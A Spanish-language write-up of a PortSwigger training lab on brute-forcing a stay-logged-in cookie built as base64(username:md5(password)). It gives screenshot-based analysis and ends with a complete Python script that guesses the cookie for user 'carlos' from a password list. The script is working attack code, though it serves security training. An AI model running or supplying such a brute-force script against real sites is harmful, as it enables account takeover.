---
title: "09 Brute-forcing a stay-logged-in cookie"
collection: publications
category: portswigger
permalink: publications/Authentication/09_Brute-forcing a stay-logged-in cookie
excerpt: 'Este laboratorio permite a los usuarios permanecer conectados incluso después de cerrar la sesión del navegador. La cookie utilizada para proporcionar esta funcionalidad es vulnerable a la fuerza bruta.'
date: 2024-12-05
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Brute-forcing a stay-logged-in cookie'
---

![logo]({{site.url}}/images/Authentication/authentication-lab-09/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Authentication/authentication-lab-09/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, fuerza bruta la cookie de Carlos para acceder a su `My account page`.

## Recursos Necesarios

* [Contraseñas](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Analisis

Probamos la autenticación con un usuario valido con el cual tengamos las credenciales y vemos el proceso de login desde el BurpSuite.

![login]({{site.url}}/images/Authentication/authentication-lab-09/login.png)

Ese `Set-Cookie: stay-logged-in` es un codigo que podemos desencriptar

![login2]({{site.url}}/images/Authentication/authentication-lab-09/login2.png)

La cookie trae esta información

![Cookie]({{site.url}}/images/Authentication/authentication-lab-09/cookie.png)

Verificamos, que tipo de encriptación es. La aplicación nos arroja que es MD5 y el contenido es `peter`

![Crack]({{site.url}}/images/Authentication/authentication-lab-09/crack.png)

## Brute Force

La estructura de la cookies es: `base64(carlos:md5(password))`

![login3]({{site.url}}/images/Authentication/authentication-lab-09/login3.png)

Vamos a armar la estructura para que BurpSuite pueda realizar el ataque de password

## Codificación HASH MD5

Primero codificamos el password con `HASH MD5`

![Hash]({{site.url}}/images/Authentication/authentication-lab-09/hash.png)

## Añadimos prefijo

Añadimos prefijo, la cual esta en la estructura `carlos:`

![Hash2]({{site.url}}/images/Authentication/authentication-lab-09/hash2.png)

## Codificamos en Base64

Por ultimo codificamos en Base64 la cookie

![Hash3]({{site.url}}/images/Authentication/authentication-lab-09/hash3.png)

## Respuesta

![Respuesta]({{site.url}}/images/Authentication/authentication-lab-09/respuesta.png)

## Aprobado

![Aprobado]({{site.url}}/images/Authentication/authentication-lab-09/aprobado.png)

# Codigo Python

```python
import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url):

    print("(+) Brute-forcing Carlos's password...")
    with open('passwords.txt', 'r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
            encoded_pwd = base64.b64encode(bytes(hashed_pwd, "utf-8"))
            str_pwd = encoded_pwd.decode("utf-8")

            # perform the request
            r  = requests.Session()
            myaccount_url = url + "/my-account"
            cookies = {'stay-logged-in': str_pwd}
            req = r.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
            if "Log out" in req.text:
                print("(+) Carlos's password is: " + pwd)
                sys.exit(-1)
        print("(-) Could not find Carlos's password.")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)


if __name__ == "__main__":
    main()
```